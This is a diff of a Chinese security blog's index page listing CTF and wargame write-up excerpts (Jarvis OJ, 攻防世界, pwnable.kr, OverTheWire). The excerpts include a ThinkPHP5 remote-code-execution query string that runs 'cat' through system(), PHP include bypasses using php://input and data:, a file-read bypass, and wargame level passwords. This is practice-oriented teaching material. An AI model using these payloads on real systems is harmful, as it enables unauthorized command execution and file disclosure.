@@ -140,34 +140,77 @@
     
     
     <div class="col-12 col-md-8 m-auto">
-      <a href="/2019/12/22/Jarvis-OJ-admin/">
-        <p class="h4 index-header">Jarvis OJ admin</p>
+      <a href="/2020/01/19/%E9%BB%91%E5%AE%A2%E4%B8%9B%E6%9E%97%E4%B9%8B%E6%97%85/">
+        <p class="h4 index-header">黑客丛林之旅</p>
         
         
           
-          
         
-        <div class="index-excerpt" style="max-height: none;">
-          <div class="index-text mb-1">admin
-题目链接：http ://web.jarvisoj.com:32792 /
-点开页面后是一个hello world，看了看F12什么都没发现，用bp也没发现什么东西。用御剑先扫一波，马上发现了robots.txt。...</div>
+        <div class="index-excerpt" >
+          <div class="index-text mb-1">level 1F12看脚本直接第二关
+level 2修改脚本为return true
+level 3在源码中没有发现什么。用bp拦截看看。将login=no改为login=yes
+level 4一点都不知道怎么做，看了看wp。莫斯科电码。
+
+iamok
+
+level 5直接base64解码没有技术含量。
+
+base64isok
+
+level 61、这关考察的是对默认端口的熟悉程度、2、Mstsc是Windows的远程桌面程序、其默认端口是33893、Vnc是Linux的远程桌面程序、其默认端口是5900、4、当Vnc连接一台服务器时、默认端口为5901、两台为5902、5、Mssql为1433、Mysql：3306、Oracle：1521、所以password=6260
+第七关：http://www.fj543.com/hack/?level=75901
+level 7页面是个gif图片，将图片下载到本地，用txt打开，看到结尾处有提示六幅图按照顺序是
+8bIGNOREwmUPPERCASEqneWORDS
+其中大写字母构成：
+IGNORE UPPERCASE WORDS
+也就是要忽略</div>
         </div>
       </a>
 
       <div>
         
-          <i class="iconfont icon-riqi2"></i>&nbsp;2019-12-22&nbsp;&nbsp;
+          <i class="iconfont icon-riqi2"></i>&nbsp;2020-01-19&nbsp;&nbsp;
+        
+        
+        
+      </div>
+    </div>
+  </div>
+
+  <div class="row mb-4 mx-auto">
+    
+    
+    <div class="col-12 col-md-8 m-auto">
+      <a href="/2020/01/19/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E9%AB%98%E6%89%8B%E8%BF%9B%E9%98%B6%E5%8C%BAPHP-rec/">
+        <p class="h4 index-header">攻防世界高手进阶区PHP_rec</p>
+        
+        
+          
+        
+        <div class="index-excerpt" >
+          <div class="index-text mb-1">php_rec进去以后F12看源码，什么都没发现。用御剑扫描一波没发现什么。就直接搜索thinkphp5 rce漏洞,改一改payload就出了。
+
+?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=cat%20../../../flag
+
+</div>
+        </div>
+      </a>
+
+      <div>
+        
+          <i class="iconfont icon-riqi2"></i>&nbsp;2020-01-19&nbsp;&nbsp;
         
         
           <i class="iconfont icon-inbox"></i>
           
-            <a href="/categories/web">web</a>&nbsp;
+            <a href="/categories/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%8Cweb">攻防世界，web</a>&nbsp;
           &nbsp;
         
         
           <i class="iconfont icon-tag"></i>
           
-            <a href="/tags/web%EF%BC%8CJARvis%20OJ">web，JARvis OJ</a>&nbsp;
+            <a href="/tags/WEB%EF%BC%8Cphp">WEB，php</a>&nbsp;
           
         
       </div>
@@ -178,34 +221,132 @@
     
     
     <div class="col-12 col-md-8 m-auto">
-      <a href="/2019/12/22/PHP%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E%EF%BC%88%E4%B8%80%EF%BC%89/">
-        <p class="h4 index-header">PHP代码漏洞（一）</p>
+      <a href="/2020/01/16/Linux%E4%B8%8B%E5%AE%89%E8%A3%85UPX/">
+        <p class="h4 index-header">Linux下安装UPX</p>
         
         
           
-          
         
-        <div class="index-excerpt" style="max-height: none;">
-          <div class="index-text mb-1">常见危险函数php代码执行相关eval()mixed eval ( string $code )把字符串code作为php代码执行。常见的一句话木马：...</div>
+        <div class="index-excerpt" >
+          <div class="index-text mb-1">upx 是一款压缩可执行文件的软件，压缩率在 20% 到 %70 之间。在可执行文件运行的时候并不需要解压软件，程序在内存中自动展开。
+本教程在 linux 下进行，理论上支持所有 linux 发型版。
+安装 upxupx 请从 upx 官网下载，不要用包管理器进下载。一般来说发行版默认源的软件比较老可能不支持比较新的语言生成的二进制文件，有压坏二进制的风险。
+本教程的下载地址可能不是最新版请访问 https://upx.github.io 下载最新版
+下载 upx
+
+
+
+wget https://github.com/upx/upx/releases/download/v3.95/upx-3.95-amd64_linux.tar.xz
+
+
+
+解压二进制
+
+
+
+tar -Jxf upx*.tar.xz
+
+
+
+为了方便使用移动 upx 到系统变量目录，如果不愿意使用 root 的话可以将 upx 目录添加到环境变量
+
+
+
+sudo cp upx*/upx /usr/bin
+
+
+
+然后就可以使用了
+</div>
         </div>
       </a>
 
       <div>
         
-          <i class="iconfont icon-riqi2"></i>&nbsp;2019-12-22&nbsp;&nbsp;
+          <i class="iconfont icon-riqi2"></i>&nbsp;2020-01-16&nbsp;&nbsp;
+        
+        
+        
+      </div>
+    </div>
+  </div>
+
+  <div class="row mb-4 mx-auto">
+    
+    
+    <div class="col-12 col-md-8 m-auto">
+      <a href="/2020/01/15/pwnable-kr%E8%A7%A3%E9%A2%98%EF%BC%88%E4%B8%80%EF%BC%89/">
+        <p class="h4 index-header">pwnable.kr解题（一）</p>
+        
+        
+          
+        
+        <div class="index-excerpt" >
+          <div class="index-text mb-1">fdssh fd@pwnable.kr -p2222 (pw:guest)
+fd@pwnable:~$ cat fd.c
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+char buf[32];
+int main(int argc, char* argv[], char* envp[]){
+    if(argc&lt;2){
+        printf(&quot;pass argv[1] a number\n&quot;);
+        return 0;
+    }
+    int fd = atoi( argv[1] ) - 0x1234;
+    int len = 0;
+    len = read(fd, buf, 32);
+    if(!strcmp(&quot;LETMEWIN\n&quot;, buf)){
+        printf(&quot;good job :)\n&quot;);
+        system(&quot;/bin/cat </div>
+        </div>
+      </a>
+
+      <div>
+        
+          <i class="iconfont icon-riqi2"></i>&nbsp;2020-01-15&nbsp;&nbsp;
+        
+        
+        
+      </div>
+    </div>
+  </div>
+
+  <div class="row mb-4 mx-auto">
+    
+    
+    <div class="col-12 col-md-8 m-auto">
+      <a href="/2020/01/14/overthewire-narnia%E8%A7%A3%E9%A2%98-%E4%B8%80/">
+        <p class="h4 index-header">overthewire narnia解题(一)</p>
+        
+        
+          
+        
+        <div class="index-excerpt" >
+          <div class="index-text mb-1">level 0账号：narnia0 密码：narnia0SSH为narnia.labs.overthewire.orgas后narnia0，将目录更改为/narnia并运行ls -l。从输出中，我们可以看到我们具有的读取权限narnia0.c。我们还可以看到该资源narnia0归该narnia0组所有（通过运行我们可以看到它属于该组），并且我们对该组id拥有执行权限。此外，由于setuid位已设置（如的输出左侧所示），并且归所有者所有，因此我们可以看到它narnia0可以作为narnia1用户执行。从输出中我们可以看到是x86 ELF二进制文件。似乎很清楚，那就是它的源代码，我们需要利用sls -lnarnia1file narnia0narnia0narnia0.cnarnia0narnia0以某种方式编写程序，这样我们就可以运行任意命令narnia1。运行cat narnia0.c给出以下输出。
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+
+int main(){
+    long val=0x41414141;
+    c</div>
+        </div>
+      </a>
+
+      <div>
+        
+          <i class="iconfont icon-riqi2"></i>&nbsp;2020-01-14&nbsp;&nbsp;
         
         
           <i class="iconfont icon-inbox"></i>
           
-            <a href="/categories/WEB">WEB</a>&nbsp;
+            <a href="/categories/pwn">pwn</a>&nbsp;
           &nbsp;
         
         
           <i class="iconfont icon-tag"></i>
           
-            <a href="/tags/WEB">WEB</a>&nbsp;
-          
-            <a href="/tags/PHP">PHP</a>&nbsp;
+            <a href="/tags/pwn">pwn</a>&nbsp;
           
         
       </div>
@@ -216,35 +357,37 @@
     
     
     <div class="col-12 col-md-8 m-auto">
-      <a href="/2019/12/21/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/">
-        <p class="h4 index-header">堆叠注入</p>
+      <a href="/2020/01/13/overthewire%E8%A7%A3%E9%A2%98%EF%BC%88%E4%BA%8C%EF%BC%89/">
+        <p class="h4 index-header">overthewire解题（二）</p>
         
         
           
-          
         
-        <div class="index-excerpt" style="max-height: none;">
-          <div class="index-text mb-1">##堆叠注入
-预编译绕过预编译相关语法如下：...</div>
+        <div class="index-excerpt" >
+          <div class="index-text mb-1">level 13用账号：bandit13，密码：8ZjyCRiBWFYkneahHwxCv3wb2a1ORpYL进入本关
+    bandit13@bandit:~$ ssh -i sshkey.private bandit14@localhost
+    Could not create directory &#39;/home/bandit13/.ssh&#39;.
+    The authenticity of host &#39;localhost (127.0.0.1)&#39; can&#39;t be established.
+    ECDSA key fingerprint is SHA256:98UL0ZWr85496EtCRkKlo20X3OPnyPSB5tB5RPbhczc.
+    Are you sure you want to continue connecting (yes/no)? yes
+    Failed to add the host to the list of known hosts (/home/bandit13/.ssh/known_h</div>
         </div>
       </a>
 
       <div>
         
-          <i class="iconfont icon-riqi2"></i>&nbsp;2019-12-21&nbsp;&nbsp;
+          <i class="iconfont icon-riqi2"></i>&nbsp;2020-01-13&nbsp;&nbsp;
         
         
           <i class="iconfont icon-inbox"></i>
           
-            <a href="/categories/SQL%E6%B3%A8%E5%85%A5">SQL注入</a>&nbsp;
+            <a href="/categories/pwn">pwn</a>&nbsp;
           &nbsp;
         
         
           <i class="iconfont icon-tag"></i>
           
-            <a href="/tags/WEB">WEB</a>&nbsp;
-          
-            <a href="/tags/SQL%E6%B3%A8%E5%85%A5">SQL注入</a>&nbsp;
+            <a href="/tags/pwn">pwn</a>&nbsp;
           
         
       </div>
@@ -255,23 +398,92 @@
     
     
     <div class="col-12 col-md-8 m-auto">
-      <a href="/2019/12/21/Jarvis-OJ-port-51/">
-        <p class="h4 index-header">Jarvis OJ port 51</p>
+      <a href="/2020/01/12/overthewire%E8%A7%A3%E9%A2%98%EF%BC%88%E4%B8%80%EF%BC%89/">
+        <p class="h4 index-header">overthewire解题（一）</p>
         
         
           
-          
         
-        <div class="index-excerpt" style="max-height: none;">
-          <div class="index-text mb-1">题目链接: http://web.jarvisoj.com:32770/访问页面之后，页面显示：
-Please use port 51 to visit this site.
-当时看到了这个还以为是需要访问这个网站的51端口，但是这个网址已经确定了是访问32770端口，后来一直都没有思路。最后才发现是要求本地以51端口去访问这个网址。payload如下：...</div>
+        <div class="index-excerpt" >
+          <div class="index-text mb-1">level 0直接lscat readme
+level 1pwd
+cat ./.-
+level 2关于转义字符可以用反斜杠进行转义。也可以用tab键。
+
+level 3这里将文件进行了隐藏直接用find找到了隐藏文件。密码
+
+
+
+pIwrPrtPN36QITSp3EQaw936yaFoFgAB
+
+
+
+level 4这题很简单，直接一个一个文件读取就行了密码：
+
+
+
+koReBOKuIDDepwhWk7jZC0RTdopnAYKh
+
+
+
+level 5按照笨方法应该已经不能用了“ls -l”除文件名称外，亦将文件型态、权限、拥有者、文件大小等资讯详细列出，发现有很多文件夹，”find . -type f -size 1033c”，”.”查找当前目录以及子目录，-type f指定文件类型为普通文件，-size 1033c指定文件大小为 1033 bytes.密码：
+
+
+
+DXjZPULLxYr17uwoI01bNLQbtFemEgo7
+
+
+
+level 6grep（global search regular expression(RE) and print out the line，全面搜</div>
         </div>
       </a>
 
       <div>
         
-          <i class="iconfont icon-riqi2"></i>&nbsp;2019-12-21&nbsp;&nbsp;
+          <i class="iconfont icon-riqi2"></i>&nbsp;2020-01-12&nbsp;&nbsp;
+        
+        
+          <i class="iconfont icon-inbox"></i>
+          
+            <a href="/categories/pwn">pwn</a>&nbsp;
+          &nbsp;
+        
+        
+          <i class="iconfont icon-tag"></i>
+          
+            <a href="/tags/pwn">pwn</a>&nbsp;
+          
+        
+      </div>
+    </div>
+  </div>
+
+  <div class="row mb-4 mx-auto">
+    
+    
+    <div class="col-12 col-md-8 m-auto">
+      <a href="/2020/01/11/Jarvis-OJ-%E7%A5%9E%E7%9B%BE%E5%B1%80%E7%9A%84%E7%A7%98%E5%AF%86/">
+        <p class="h4 index-header">Jarvis OJ 神盾局的秘密</p>
+        
+        
+          
+        
+        <div class="index-excerpt" >
+          <div class="index-text mb-1">神盾局的秘密题目链接：http://web.jarvisoj.com:32768/题目提示:
+这里有个通向神盾局内部网络的秘密入口，你能通过漏洞发现神盾局的秘密吗？
+访问链接之后，得到就是一张图片，通过burp抓包，发现在中途访问了网址http://web.jarvisoj.com:32768/showimg.php?img=c2hpZWxkLnBocA==，看链接是一个文件读取，文件名是使用base64加密了。读取showimg.php的内容:
+&lt;?php
+    $f = $_GET[&#39;img&#39;];
+    if (!empty($f)) {
+        $f = base64_decode($f);
+        if (stripos($f,&#39;..&#39;)===FALSE &amp;&amp; stripos($f,&#39;/&#39;)===FALSE &amp;&amp; stripos($f,&#39;\\&#39;)===FALSE
+        &amp;&amp; stripos($f,&#39;pctf&#39;)===</div>
+        </div>
+      </a>
+
+      <div>
+        
+          <i class="iconfont icon-riqi2"></i>&nbsp;2020-01-11&nbsp;&nbsp;
         
         
           <i class="iconfont icon-inbox"></i>
@@ -291,11 +503,99 @@ Please use port 51 to visit this site.
     </div>
   </div>
 
+  <div class="row mb-4 mx-auto">
+    
+    
+    <div class="col-12 col-md-8 m-auto">
+      <a href="/2020/01/10/python%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/">
+        <p class="h4 index-header">python模板注入</p>
+        
+        
+          
+        
+        <div class="index-excerpt" >
+          <div class="index-text mb-1">https://www.freebuf.com/column/187845.html
+攻防世界中模板注入例题的wp:https://blog.csdn.net/qq_40884727/article/details/101605002
+https://blog.csdn.net/qq_17204441/article/details/102857726
+</div>
+        </div>
+      </a>
+
+      <div>
+        
+          <i class="iconfont icon-riqi2"></i>&nbsp;2020-01-10&nbsp;&nbsp;
+        
+        
+          <i class="iconfont icon-inbox"></i>
+          
+            <a href="/categories/WEB%EF%BC%8Cpython">WEB，python</a>&nbsp;
+          &nbsp;
+        
+        
+      </div>
+    </div>
+  </div>
+
+  <div class="row mb-4 mx-auto">
+    
+    
+    <div class="col-12 col-md-8 m-auto">
+      <a href="/2019/12/28/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/">
+        <p class="h4 index-header">攻防世界web进阶区Web_php_include</p>
+        
+        
+          
+        
+        <div class="index-excerpt" >
+          <div class="index-text mb-1">Web_php_include
+strstr() 函数搜索字符串在另一字符串中的第一次出现。注释：该函数是二进制安全的。注释：该函数对大小写敏感。如需进行不区分大小写的搜索，请使用 stristr() 函数。
+那就利用大小写绕过输入：
+
+
+?page=phP://input
+
+
+图片里我忘记打成大写了。
+
+直接访问flag发现一片空白。
+
+那就继续在burp里用cat命令访问，成功取得flag。
+事后观看其他人的思路还可以用data直接查看：
+
+
+?page=data:text/plain,
+
+
+或者麻烦一点用菜刀也可以做出来。
+</div>
+        </div>
+      </a>
+
+      <div>
+        
+          <i class="iconfont icon-riqi2"></i>&nbsp;2019-12-28&nbsp;&nbsp;
+        
+        
+          <i class="iconfont icon-inbox"></i>
+          
+            <a href="/categories/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%8Cweb">攻防世界，web</a>&nbsp;
+          &nbsp;
+        
+        
+          <i class="iconfont icon-tag"></i>
+          
+            <a href="/tags/WEB%EF%BC%8Cupload">WEB，upload</a>&nbsp;
+          
+        
+      </div>
+    </div>
+  </div>
+
 
 
   <nav aria-label="index posts navigation">
     <span class="pagination pg-blue justify-content-center mt-5" id="pagination">
-      <a class="extend prev" rel="prev" href="/page/2/"><i class="fas fa-angle-double-left"></i></a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span>
+      <a class="extend prev" rel="prev" href="/page/2/"><i class="fas fa-angle-double-left"></i></a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><a class="extend next" rel="next" href="/page/4/"><i class="fas fa-angle-double-right"></i></a>
     </span>
   </nav>
   
